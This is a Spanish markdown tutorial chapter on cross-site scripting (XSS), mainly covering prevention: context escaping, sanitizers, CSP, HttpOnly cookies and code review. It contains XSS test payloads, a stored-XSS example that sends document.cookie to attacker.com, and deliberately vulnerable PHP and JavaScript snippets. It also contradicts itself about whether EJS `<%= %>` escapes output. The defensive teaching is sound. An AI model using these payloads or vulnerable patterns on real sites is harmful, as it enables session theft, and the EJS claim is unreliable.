| **Inicio**         | **atr√°s 5**                           | **Siguiente 7**                          |
| ------------------ | ------------------------------------- | ---------------------------------------- |
| [üè†](../README.md) | [‚è™](./10_5_What_is_SQL_Injection.md) | [‚è©](./10_7_What_is_Evil_Twin_attack.md) |

---

## **√çndice**

| Temario                                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------------------------------- |
| [308. Secuencias de comandos entre sitios (XSS) - OWASP](#308-secuencias-de-comandos-entre-sitios-xss---owasp)                                 |
| [309. Hoja de trucos para prevenir secuencias de comandos entre sitios](#309-hoja-de-trucos-para-prevenir-secuencias-de-comandos-entre-sitios) |
| [310. Secuencias de comandos entre sitios](#310-secuencias-de-comandos-entre-sitios)                                                           |

# **XSS**

## **308. Secuencias de comandos entre sitios (XSS) - OWASP**

![XSS](/img/10_Common_Attacks/Xss.png "XSS")

### üîé Descripci√≥n general de XSS

La **inyecci√≥n de secuencias de comandos entre sitios (Cross-Site Scripting o XSS)** ocurre cuando una aplicaci√≥n web permite que un atacante **inyecte c√≥digo malicioso en el navegador de otro usuario** (normalmente JavaScript).

Ese c√≥digo se ejecuta en el navegador de la v√≠ctima como si fuera leg√≠timo, lo que permite al atacante:

- Robar cookies de sesi√≥n.
- Manipular el DOM (interfaz visual).
- Redirigir a sitios falsos (phishing).
- Mostrar formularios falsos para robar credenciales.
- Usar la sesi√≥n de la v√≠ctima para realizar acciones sin su consentimiento (CSRF combinado con XSS).

XSS aparece en el **OWASP Top 10** como una de las vulnerabilidades web m√°s frecuentes.

### ‚öîÔ∏è Actividades de seguridad relacionadas

1. **Revisi√≥n de entradas de usuario**: analizar c√≥mo la app procesa par√°metros de URL, formularios, cabeceras, etc.
2. **Validaci√≥n y codificaci√≥n de salida**: comprobar si los datos del usuario se muestran en HTML sin sanear.
3. **Uso de Content Security Policy (CSP)**: aplicar cabeceras que limiten scripts.
4. **Pentesting / pruebas din√°micas**: inyectar cadenas de prueba controladas para verificar si se ejecutan.
5. **Auditor√≠as de logs**: detectar intentos de explotaci√≥n de XSS.

### üõ°Ô∏è C√≥mo evitar vulnerabilidades XSS

Las defensas se dividen en **validaci√≥n/escapado** y **configuraci√≥n de seguridad**:

‚úÖ **Escapar salida seg√∫n el contexto**:

- HTML ‚Üí `&lt;`, `&gt;`, `&quot;`, etc.
- JavaScript ‚Üí escapar comillas, saltos de l√≠nea.
- Atributos HTML ‚Üí comillas obligatorias y escapadas.
- CSS / URL ‚Üí validaci√≥n estricta (evitar inyecciones de `javascript:`).

‚úÖ **Librer√≠as seguras**: usar funciones de frameworks (React, Angular, Django, etc.), que ya manejan el escape autom√°tico.

‚úÖ **Validaci√≥n de entrada**: rechazar o sanear datos que no cumplan formato esperado (ej. emails, IDs).

‚úÖ **CSP (Content Security Policy)**: cabecera HTTP que limita qu√© scripts pueden ejecutarse. Ejemplo:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

‚úÖ **HttpOnly y Secure cookies**: cookies de sesi√≥n deben estar marcadas como `HttpOnly` para que JavaScript no las lea.

### üëÄ C√≥mo revisar c√≥digo para encontrar XSS

En una **code review** busca:

- Concatenaci√≥n de **entradas del usuario** dentro de HTML.
- Uso directo de `innerHTML`, `document.write()`, `eval()`.
- Variables que vienen de `req.query`, `req.body`, `$_GET`, `$_POST`, etc. sin escape.
- Falta de sanitizaci√≥n en plantillas.

Ejemplo vulnerable (Node.js + Express + EJS):

```ejs
<!-- VULNERABLE: imprime input directamente -->
<p>Hola <%= req.query.name %></p>
```

Ejemplo seguro:

```ejs
<!-- SEGURO: EJS hace escaping autom√°tico -->
<p>Hola <%- _.escape(req.query.name) %></p>
```

### üîç C√≥mo detectar vulnerabilidades XSS

1. **Pruebas manuales**: introducir cadenas de prueba como `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`.
2. **Herramientas automatizadas**: OWASP ZAP, Burp Suite, Arachni.
3. **An√°lisis din√°mico (DAST)**: ejecutar fuzzing contra la aplicaci√≥n en un entorno controlado.
4. **An√°lisis est√°tico (SAST)**: buscar patrones de concatenaci√≥n de variables en el c√≥digo.
5. **Explorar vectores poco comunes**: cabeceras HTTP, campos ocultos, valores JSON.

### üìù Descripci√≥n de tipos de ataques XSS

#### üîπ XSS reflejado

- El payload se env√≠a en una **URL o petici√≥n** y se refleja directamente en la respuesta.
- Ejemplo:

```
https://example.com/search?q=<script>alert(1)</script>
```

Si el servidor imprime `q` sin escapar, el script se ejecuta en el navegador de la v√≠ctima.

#### üîπ XSS almacenado

- El payload se **guarda en la base de datos** y se ejecuta cada vez que otro usuario lo ve.
- Ejemplo: un atacante publica un comentario con `<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>`.
- Cada usuario que vea la p√°gina ejecutar√° ese script.

### ‚ö° Ejemplos educativos

#### Ejemplo vulnerable (PHP):

```php
// VULNERABLE
echo "Bienvenido " . $_GET["usuario"];
```

Si el atacante env√≠a:

```
http://example.com/?usuario=<script>alert(1)</script>
```

El navegador ejecutar√° el `alert(1)`.

#### Ejemplo seguro (PHP):

```php
// SEGURO
echo "Bienvenido " . htmlspecialchars($_GET["usuario"], ENT_QUOTES, 'UTF-8');
```

### üìå Resumen (cheat-sheet r√°pida XSS)

- ‚ùå Nunca uses `innerHTML`, `document.write`, `eval` con input externo.
- ‚úÖ Escapa siempre la salida seg√∫n el **contexto** (HTML, JS, atributos, etc.).
- ‚úÖ Usa frameworks modernos (React, Angular) ‚Üí auto-escapan valores.
- ‚úÖ Implementa **CSP** y cookies `HttpOnly`.
- ‚úÖ Prueba manualmente y con herramientas autom√°ticas.
- ‚úÖ Haz revisiones de c√≥digo buscando input sin escapar.

---

[üîº](#√≠ndice)

---

## **309. Hoja de trucos para prevenir secuencias de comandos entre sitios**

### üîß Seguridad del marco (framework security)

- Usa frameworks modernos (React, Angular, Vue, Django, Rails) ‚Üí ya incluyen **escape autom√°tico**.
- No desactives mecanismos de seguridad del framework (ej. `dangerouslySetInnerHTML` en React, `ng-bind-html` sin sanitizar en Angular).
- Habilita **plantillas seguras** (`{{ variable }}` en lugar de `{{{ variable }}}`).
- Actualiza librer√≠as y frameworks con parches de seguridad.

### üß≠ Filosof√≠a de defensa XSS

- **Escapa siempre la salida**, no solo valides la entrada.
- Defiende seg√∫n el **contexto**: HTML, atributo, JavaScript, CSS o URL.
- Usa el **principio de menor privilegio** en scripts: limitar capacidades con **CSP**.
- Combina varias defensas (no hay una sola bala de plata).

### üìù Codificaci√≥n de salida (output encoding)

- HTML ‚Üí `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`.
- Atributos HTML ‚Üí comillas obligatorias, escapar comillas simples/dobles.
- JavaScript ‚Üí escapar comillas, barras invertidas y saltos de l√≠nea.
- CSS ‚Üí no permitir valores de entrada din√°micos sin whitelist estricta.
- URLs ‚Üí validar esquema (`http`, `https`) y escapar caracteres especiales.

Ejemplo en PHP:

```php
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

Ejemplo en JavaScript (DOM):

```js
const safeText = document.createTextNode(userInput);
element.appendChild(safeText);
```

### üßπ Sanitizaci√≥n de HTML

- Usa librer√≠as para limpiar HTML si necesitas mostrar contenido de usuario:

  - **DOMPurify** (JavaScript).
  - **Bleach** (Python).
  - **HTML Purifier** (PHP).

- Define una **whitelist** de etiquetas y atributos permitidos.
- Elimina scripts, eventos (`onerror`, `onclick`, etc.) y URLs con `javascript:`.

### üö∞ Fregaderos seguros (safe sinks)

Un ‚Äúsink‚Äù es cualquier punto donde los datos llegan al DOM o al navegador.

- Prefiere `textContent`, `innerText` o `setAttribute("value", ...)` en lugar de `innerHTML` o `document.write()`.
- Evita `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`.
- Usa APIs seguras de frameworks en vez de manipulaci√≥n cruda del DOM.

Ejemplo seguro:

```js
element.textContent = userInput; // SEGURO
element.innerHTML = userInput; // ‚ùå INSEGURO
```

### üõ†Ô∏è Otros controles

- **CSP (Content Security Policy):**

  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
  ```

- **Cookies de sesi√≥n con `HttpOnly` y `Secure`.**
- **Escaneo regular** con OWASP ZAP, Burp Suite, SonarQube.
- **Validaci√≥n de entrada** estricta (ej. emails, IDs, n√∫meros).
- **Revisi√≥n de logs** para detectar intentos de inyecci√≥n.

### üìã Resumen de las reglas de prevenci√≥n de XSS

1. Nunca mezcles entrada del usuario sin escapar en HTML/JS.
2. Escapa la salida seg√∫n el contexto.
3. Usa frameworks modernos con escape autom√°tico.
4. Sanitiza contenido HTML si debe mostrarse.
5. Configura CSP y cookies seguras.
6. Evita sinks peligrosos (`innerHTML`, `eval`).
7. Audita c√≥digo y haz pruebas din√°micas.

### üìå Resumen de reglas de codificaci√≥n de salida

- HTML ‚Üí `htmlspecialchars()` o equivalente.
- Atributo HTML ‚Üí escapar comillas simples y dobles.
- JavaScript ‚Üí usa `JSON.stringify` o `\uXXXX` para caracteres.
- CSS ‚Üí valida y escapa (evitar `expression()`, `url(javascript:...)`).
- URLs ‚Üí solo `http(s)://`, nunca `javascript:` ni `data:`.

### ‚ùå Antipatrones comunes (enfoques ineficaces que conviene evitar)

- üö´ **Blacklists simples** (`replace("<script>", "")`) ‚Üí f√°ciles de evadir.
- üö´ **Filtrar solo ciertas etiquetas** ‚Üí XSS tambi√©n se puede inyectar en atributos o eventos.
- üö´ **Confiar solo en validaci√≥n de entrada** ‚Üí siempre escapar salida.
- üö´ **Desactivar medidas del framework** (ej. `bypassSecurityTrustHtml` en Angular).
- üö´ **Permitir HTML sin sanitizaci√≥n** (blogs, comentarios).
- üö´ **Usar WAF como √∫nica defensa** ‚Üí debe ser complementario, no reemplazo.

üìå **Conclusi√≥n:**

El XSS no se previene con un solo control, sino con una **estrategia en capas**:

1. Frameworks seguros.
2. Codificaci√≥n de salida seg√∫n contexto.
3. Sanitizaci√≥n de HTML.
4. Uso de sinks seguros.
5. Pol√≠ticas de seguridad como CSP.
6. Auditor√≠as regulares.

---

[üîº](#√≠ndice)

---

## **310. Secuencias de comandos entre sitios**

**Cross-Site Scripting (XSS)** es una vulnerabilidad web donde una aplicaci√≥n permite que c√≥digo malicioso (normalmente JavaScript) llegue al navegador de otros usuarios y se ejecute con su contexto (cookies, permisos, DOM). Es peligrosa porque el atacante puede robar sesiones, forzar acciones en nombre del usuario, robar datos visibles, inyectar keyloggers o redirigir a phishing.

> Importante: XSS no es un ‚Äúbug raro‚Äù ‚Äî suele surgir por fallos b√°sicos de manejo de salida de datos.

### Tipos principales de XSS (con explicaci√≥n breve)

1. **Reflejado (reflected)**

   - El payload viene en la petici√≥n (query, formulario) y se refleja en la respuesta inmediatamente.
   - Ej.: `https://site.example/search?q=<script>‚Ä¶</script>` ‚Äî si la app imprime `q` sin escapar, el script se ejecuta.

2. **Almacenado (stored / persistent)**

   - El payload se guarda en la base de datos (comentarios, perfiles, posts) y se ejecuta cuando otros usuarios visualizan esa p√°gina. Muy peligroso porque puede afectar a muchos usuarios.

3. **DOM-based (client-side)**

   - La vulnerabilidad existe en JavaScript del lado cliente: el script del sitio toma datos de `location`, `document.referrer`, `innerHTML`, etc., y los inserta en el DOM sin sanitizar. La aplicaci√≥n server-side puede no estar involucrada.

### Ejemplos vulnerables y versiones seguras (c√≥digo)

> Todos los ejemplos muestran c√≥mo **se comete** y **c√≥mo corregirlo**. No se usan payloads maliciosos reales fuera de entornos controlados.

#### 1) Reflected ‚Äî Node.js + Express + EJS (vulnerable -> seguro)

Vulnerable:

```js
// app.js (Express)
app.get("/greet", (req, res) => {
  const name = req.query.name || "invitado";
  // EJS renderiza sin escapado expl√≠cito si se fuerza
  res.render("greet", { name });
});
```

`greet.ejs`:

```ejs
<!-- VULNERABLE: si template imprime sin escape -->
<p>Hola <%= name %></p>
```

Si `name` contiene `<script>alert(1)</script>` se ejecutar√°.

Seguro (escape autom√°tico / sanitizar):

```ejs
<!-- EJS normalmente escapa <%= %>, pero si se usa raw, evitar -->
<p>Hola <%= name %></p> <!-- mantener este y no usar <%- ... %> -->
```

O sanitizar con una librer√≠a (p.ej. DOMPurify en el cliente o `sanitize-html` en Node) para casos donde se necesita HTML.

#### 2) Stored ‚Äî PHP ejemplo (vulnerable -> seguro)

Vulnerable (guardar y mostrar sin escape):

```php
// insertar comentario
$comment = $_POST['comment'];
mysqli_query($db, "INSERT INTO comments (text) VALUES ('" . $comment . "')");

// renderizar comentario
echo "<div class='comment'>{$row['text']}</div>";
```

Seguro:

```php
// al renderizar
echo "<div class='comment'>" . htmlspecialchars($row['text'], ENT_QUOTES, 'UTF-8') . "</div>";
```

O usar un sanitizador si permites HTML seguro (ver DOMPurify / HTML Purifier).

#### 3) DOM-based ‚Äî JavaScript cliente (vulnerable -> seguro)

Vulnerable:

```html
<!-- index.html -->
<div id="out"></div>
<script>
  // toma hash de URL y lo inserta crudo
  document.getElementById("out").innerHTML = location.hash.slice(1);
</script>
```

Si la URL contiene `#<img src=x onerror=alert(1)>` se ejecutar√°.

Seguro:

```js
// usar textContent o crear nodo de texto
const out = document.getElementById("out");
out.textContent = location.hash.slice(1); // muestra texto sin interpretar HTML
```

Si necesitas permitir HTML seguro, usa **DOMPurify** para limpiar antes de insertar:

```js
// con DOMPurify
out.innerHTML = DOMPurify.sanitize(unsafeHtml);
```

#### 4) React ‚Äî por defecto seguro, pero con trampas

Seguro (React escapa valores por defecto):

```jsx
// React
return <div>{userInput}</div>; // seguro: React escapa autom√°ticamente
```

Peligroso:

```jsx
// cuidado con esto
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```

Si usas `dangerouslySetInnerHTML`, sanitiza con DOMPurify **antes**.

#### 5) Flask / Jinja2 (Python)

Jinja2 hace **autoescape** en HTML por defecto:

```jinja
<!-- template.html -->
<p>{{ user_input }}</p> <!-- seguro: escapado autom√°ticamente -->
```

Cuidado con `|safe` (desactiva escape) ‚Äî solo usar si el HTML fue limpiado.

### ¬øD√≥nde buscar XSS en el c√≥digo? (sinks y fuentes)

- **Fuentes (input):** `req.query`, `req.body`, `$_GET`, `location`, `document.referrer`, inputs de usuarios, campos de perfil, uploads.
- **Sinks (donde el input puede ejecutar c√≥digo):** `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `setInterval(string)`, `elem.src = userValue` (si no se valida), `href` con `javascript:`.
- **Plantillas sin escape, atributos HTML construidos por concatenaci√≥n**.

### Reglas de codificaci√≥n y escape seg√∫n contexto

- **Texto HTML (entre etiquetas):** escapar `& < > " ' /` ‚Üí usar funciones de escape del framework (`htmlspecialchars`, `HTMLEncode`, etc.) o APIs DOM (`textContent` / `createTextNode`).
- **Atributo HTML:** escapar comillas; poner el valor entre comillas siempre.
- **Contexto JavaScript (in-script):** evita inyectar valores sin procesar; usa `JSON.stringify` para pasar datos desde servidor a script de forma segura:

  ```html
  <script>
    const cfg = JSON.parse("{{ server_json | tojson }}");
  </script>
  ```

- **URL:** usar `encodeURIComponent` y validar esquema (`http/https`) para evitar `javascript:` o `data:`.
- **CSS:** no inyectar valores en estilos sin whitelist y validaci√≥n.
- **HTML permitido:** si quieres permitir HTML limitado (ej. posts), usa un sanitizador (DOMPurify, Bleach, HTMLPurifier) con whitelist.

### Medidas de mitigaci√≥n t√©cnicas (pr√°cticas recomendadas)

1. **Escape de salida por contexto** ‚Äî prioridad n√∫mero 1.
2. **Usar APIs seguras del DOM**: `textContent`, `value`, `setAttribute` en lugar de `innerHTML`.
3. **Sanitizar contenido HTML** si debes aceptar HTML (DOMPurify, Bleach, HTMLPurifier).
4. **Content Security Policy (CSP)** ‚Äî a√±ade una capa que restringe or√≠genes de scripts; ejemplo b√°sico:

   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none';
   ```

   - Usar nonces o hashes es m√°s seguro que `unsafe-inline`. CSP reduce impacto, pero no substituye escape.

5. **Cookies seguras:** `HttpOnly`, `Secure`, `SameSite=strict/lax` para mitigar robo de cookies via JS.
6. **Evitar inline scripts y estilos** cuando sea posible (facilita CSP).
7. **Principio de menor privilegio** y separaci√≥n entre componentes.
8. **Validaci√≥n de entrada por whitelist** (tipo/formato/longitud) ‚Äî √∫til, pero insuficiente por s√≠ sola.
9. **Remover errores verbosos en producci√≥n** que puedan dar pistas al atacante.
10. **Registro y monitoreo** de intentos extra√±os y uso de WAF como capa adicional.

### Detecci√≥n y pruebas (√©tica y pr√°ctica)

- **Manual:** insertar cadenas de prueba (por ejemplo un `alert(1)` en el contexto HTML o inyecciones de atributos) para verificar ejecuci√≥n _solo en entornos autorizados_.
- **Automatizado:** OWASP ZAP, Burp Suite, Arachni, Acunetix ‚Äî son herramientas que prueban vectores habituales.
- **SAST:** buscar patrones peligrosos en el c√≥digo (concatenaciones de input con salida HTML/JS).
- **Logs y telemetry:** revisar solicitudes con caracteres inusuales (`<`, `>`, `onerror`, etc.).
- **Labs para practicar legalmente:** PortSwigger Web Academy, OWASP Juice Shop, WebGoat, TryHackMe.

### Antipatrones y errores comunes

- Confiar en **blacklists** (filtrar `<script>` pero no otros vectores).
- Usar `innerHTML` para mostrar texto del usuario.
- Usar `dangerouslySetInnerHTML` sin sanitizar.
- Confiar solo en validaci√≥n de entrada sin escapar la salida.
- Configurar CSP mal (ej. permitir `unsafe-inline`) y pensar que eso ya lo cubre todo.

### Checklist r√°pida (qu√© aplicar hoy mismo)

- [ ] Escapar TODA salida HTML por contexto.
- [ ] Sustituir `innerHTML` por `textContent` donde sea posible.
- [ ] Revisar usos de `eval`, `document.write`, `setTimeout(string)`.
- [ ] A√±adir sanitizador (DOMPurify/HTMLPurifier/Bleach) si permites HTML.
- [ ] Habilitar CSP y revisar excepciones.
- [ ] Marcar cookies como `HttpOnly` y `Secure`.
- [ ] Incluir SAST en el pipeline CI y DAST en staging.
- [ ] Formar al equipo en manejo seguro de salida y sinks peligrosos.

### Resumen final

XSS es una de las vulnerabilidades m√°s comunes y explotables porque a menudo surge por descuidos sencillos en c√≥mo mostramos datos de usuario. La defensa efectiva es **simple en concepto**: **escape correcto por contexto + APIs seguras + sanitizaci√≥n cuando haya HTML + CSP y pr√°cticas de despliegue seguras**. Aplicando estas reglas de forma consistente se mitigan la mayor√≠a de los riesgos.

---

[üîº](#√≠ndice)

---

| **Inicio**         | **atr√°s 5**                           | **Siguiente 7**                          |
| ------------------ | ------------------------------------- | ---------------------------------------- |
| [üè†](../README.md) | [‚è™](./10_5_What_is_SQL_Injection.md) | [‚è©](./10_7_What_is_Evil_Twin_attack.md) |
